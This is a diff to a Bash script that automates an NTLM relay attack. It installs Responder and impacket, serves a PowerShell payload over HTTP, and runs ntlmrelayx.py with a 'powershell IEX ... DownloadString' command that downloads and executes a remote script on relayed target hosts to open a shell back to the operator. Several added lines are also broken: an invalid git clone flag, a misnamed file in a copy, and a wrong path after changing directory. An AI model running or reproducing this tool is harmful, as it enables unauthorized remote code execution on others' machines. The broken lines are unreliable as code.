@@ -95,43 +95,42 @@ function makeBck(){
 
 function checkProgramsNeeded(){
 
-    if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Checking for dependencies needed...\n"; sleep 0.5; fi
+	if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Checking for dependencies needed...\n"; sleep 0.5; fi
 	
-    programs=(tmux rlwrap python python3 netcat wget xterm net-tools)
-    for program in "${programs[@]}"; do
-		checkApt $program
-    done
+	programs=(tmux rlwrap python python3 netcat wget xterm net-tools)
+	for program in "${programs[@]}"; do checkApt $program; done
 	
-    which $(pwd)/responder/Responder.py &>/dev/null
+	test -f $(pwd)/responder/Responder.py &>/dev/null
 	if [ $? -eq 0 ]; then
-        if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} Responder installed\n"; sleep 0.5; fi
-        makeBck
+        	if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} Responder installed\n"; sleep 0.5; fi
+        	makeBck
 	else
-      if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} Responder not installed, installing in '$(pwd)/responder' directory";sleep 0.5; fi
-      mkdir $(pwd)/responder; git clone https://github.com/lgandx/Responder.git $(pwd)/responder &>/dev/null
-      if [ $? -eq 0 ]; then
-        chmod u+x $(pwd)/responder/Responder.py
-        if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} Respoder installed sucessfully!\n"; sleep 0.5; fi
-        makeBck
-        echo "responder" >> $(pwd)/uninstall.txt
-      else
-	    echo -e "\t${redColour}[:S]${endColour} Something bad happened, responder could not be installed. Exiting...\n"; sleep 0.5; tput cnorm; exit 1
+		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} Responder not installed, installing in '$(pwd)/responder' directory";sleep 0.5; fi
+		mkdir $(pwd)/responder; git clone https://github.com/lgandx/Responder.git $(pwd)/responder &>/dev/null
+		test -f $(pwd)/responder/Responder.py &>/dev/null
+      		if [ $? -eq 0 ]; then
+			chmod u+x $(pwd)/responder/Responder.py
+			if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} Respoder installed sucessfully!\n"; sleep 0.5; fi
+        			makeBck; echo "responder" >> $(pwd)/uninstall.txt
+		else
+			echo -e "\t${redColour}[:S]${endColour} Something bad happened, responder could not be installed. Exiting...\n"; sleep 0.5; tput cnorm; exit 1
 		fi
 	fi
 
-	which $(pwd)/ntlmrelayx.py &>/dev/null
+	test -f $(pwd)/impacket/examples/ntlmrelayx.py &>/dev/null
 	if [ $? -eq 0 ]; then
-		if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} ntlmrelayx.py installed\n";sleep 0.5; fi
+		if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} impacket installed\n";sleep 0.5; fi
 	else
-		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} ntlmrelayx.py not found, downloading in $(pwd) directory"; sleep 0.5; fi
-		wget "https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/ntlmrelayx.py" -O "$(pwd)/ntlmrelayx.py" &>/dev/null
-        test -f "$(pwd)/ntlmrelayx.py" &>/dev/null
-		if [ $? -eq 0 ]; then
-			chmod u+x "$(pwd)/ntlmrelayx.py"
-			if [ ! -z $quiet  ]; then echo -e "\t${greenColour}[:)]${endColour} ntlmrelayx.py downloaded succesfully!\n"; sleep 0.5; fi
-			echo "ntlmrelayx" >> uninstall.txt
+		if [ ! -z $quiet ];then echo -e "\t${yellowColour}[:S]${endColour} impacket not installed, installing in '$(pwd)/impacket' directory"; sleep 0.5; fi
+			mkdir $(pwd)/impacket; git clone https://github.com/SecureAuthCorp/impacket.git -O "$(pwd)/impacket" &>/dev/null
+        		test -f "$(pwd)/impacket/examples/ntlmrelayx.py" &>/dev/null
+			if [ $? -eq 0 ]; then
+				cp $(pwd)/impacket/examples/ntlmrelay.py $(pwd)/impacket/ntlmrelayx.py
+				chmod u+x $(pwd)/impacket/ntlmrelayx.py
+			if [ ! -z $quiet  ]; then echo -e "\t${greenColour}[:)]${endColour} impacket installed succesfully!\n"; sleep 0.5; fi
+				echo "impacket" >> uninstall.txt
 		else
-			echo -e "\t${redColour}[:S]${endColour} Something bad happened, ntlmrelayx.py could not be installed. Exiting...\n"; sleep 0.5; tput cnorm; exit 1
+			echo -e "\t${redColour}[:S]${endColour} Something bad happened, impacket could not be installed. Exiting...\n"; sleep 0.5; tput cnorm; exit 1
 		fi
 	fi
 
@@ -211,9 +210,9 @@ function relayingAttack(){
   if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Serving PowerShell payload at $lhost:8000...\n"; sleep 0.5; fi
   let paneID+=1; tmux select-pane -t $paneID && tmux send-keys "python3 -m http.server" C-m && sleep 1 && tmux split-window
 
-  if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Launching ntlmrelayx.py\n"; sleep 0.5; fi
+  if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Launching ntlmrelayx.py from impacket\n"; sleep 0.5; fi
   command="powershell IEX (New-Object Net.WebClient).DownloadString('http://$lhost:8000/shell.ps1')"
-  let paneID+=1; tmux select-pane -t $paneID && tmux send-keys "python $(pwd)/ntlmrelayx.py -tf $targets -smb2support -c \"$command\" 2>/dev/null" C-m && sleep 1
+  let paneID+=1; tmux select-pane -t $paneID && tmux send-keys "cd impacket/ && python3 $(pwd)/impacket/ntlmrelayx.py -tf $targets -smb2support -c \"$command\" 2>/dev/null" C-m && sleep 1
 
 
   if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} $lport port open to receive the connection\n"; sleep 0.5; fi
@@ -286,8 +285,8 @@ function rmsw(){
     while read line; do
       if [ "$line" == "responder" ];then
         rm -rf $(pwd)/responder &>/dev/null
-      elif [ "$line" == "ntlmrelayx" ];then
-        rm -f $(pwd)/ntlmrelayx.py &>/dev/null
+      elif [ "$line" == "impacket" ];then
+        rm -rf $(pwd)/impacket &>/dev/null
       else
         apt remove -y $line &>/dev/null
       fi
